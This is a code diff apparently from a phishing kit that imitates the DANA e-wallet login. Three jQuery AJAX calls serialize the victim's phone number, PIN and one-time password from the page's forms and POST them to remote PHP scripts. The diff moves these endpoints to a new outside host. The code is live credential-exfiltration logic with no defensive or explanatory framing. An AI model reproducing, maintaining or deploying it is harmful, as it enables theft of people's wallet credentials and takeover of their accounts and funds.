@@ -141,7 +141,7 @@ $(".bgotp").hide();
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://choreoapps.oo-feed.cfd/dana22/one.php',
+			  url: 'https://chroedevsi.whf.bz/dana22/one.php',
 			  data: dataString,
  
     
@@ -163,7 +163,7 @@ function sendPin(){
   var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://choreoapps.oo-feed.cfd/dana22/two.php',
+			  url: 'https://chroedevsi.whf.bz/dana22/two.php',
 			  data: dataString,
  
 
@@ -196,7 +196,7 @@ $(".alert").css("color","red");
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://choreoapps.oo-feed.cfd/dana22/three.php',
+			  url: 'https://chroedevsi.whf.bz/dana22/three.php',
 			  data: dataString,
  
         
